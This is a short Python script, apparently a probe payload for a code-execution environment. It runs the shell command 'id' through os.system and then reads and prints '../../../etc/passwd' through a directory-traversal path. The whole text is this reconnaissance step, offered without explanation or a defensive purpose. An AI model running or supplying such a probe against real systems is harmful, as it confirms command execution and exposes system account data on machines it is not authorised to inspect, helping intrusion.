import os

print(os.system("id"))

file = open("../../../etc/passwd", "r")
for line in file:
    print(line)
